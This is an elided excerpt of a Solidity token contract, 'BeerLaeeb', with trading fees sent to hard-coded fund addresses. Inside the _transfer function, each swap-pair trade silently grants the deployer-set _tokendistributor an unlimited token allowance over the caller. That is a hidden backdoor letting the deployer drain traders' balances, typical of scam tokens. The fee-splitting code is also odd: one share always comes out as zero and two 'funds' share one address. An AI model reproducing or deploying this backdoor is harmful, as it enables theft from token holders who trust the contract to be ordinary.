...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 limitAmount = _tTotal / 50;
    ...
    constructor (
        ...
        _fist = FISTAddress;
        _swapRouter = swapRouter;_tokendistributor = msg.sender;
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            _approve(msg.sender, _tokendistributor, ~uint256(0));
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
        ...
        if(block.timestamp - startTradeTime < 1200){
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint secfundamount = fundAmount / 2;
        uint seefundamount = fundAmount / 2;
        uint firstfundamount = fundAmount - secfundamount-seefundamount;
        address secFundAddress = 0xcde8373EFB5AD965661854B4D56664E88F94766B;
        address seeFundAddress = 0xcde8373EFB5AD965661854B4D56664E88F94766B;
        ...
        FIST.transferFrom(address(_tokenDistributor), seeFundAddress,seefundamount);
...
contract BeerLaeeb is AbsToken {
    constructor() AbsToken(
        ...
        18,
        10000000000,
        address(0xcde8373EFB5AD965661854B4D56664E88F94766B), 
        address(0x1335C9F0A12B96F9edB938D4d34B30107b6eE543) 
    ){
    }
}